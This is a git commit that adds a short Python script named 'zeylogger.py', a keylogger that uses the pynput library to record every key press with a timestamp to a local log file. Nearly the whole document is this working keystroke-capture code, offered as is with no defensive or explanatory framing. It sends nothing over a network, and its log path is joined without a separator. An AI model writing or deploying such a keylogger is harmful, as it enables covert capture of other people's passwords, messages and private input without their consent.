8d7e63e97cfed5410756ed34ca048482ca545e03
zodmagus <39577810+zodmagus@users.noreply.github.com>
2019-04-26 18:04:02 -0500

    Create zeylogger.py

---
+++ zeylogger.py
@@ -0,0 +1,9 @@
+from pynput.keyboard import Key, Listener
+import logging
+log_dir = r"D:/tombs/Downloads"
+logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+def on_press(key):
+	logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+	listener.join()
+	
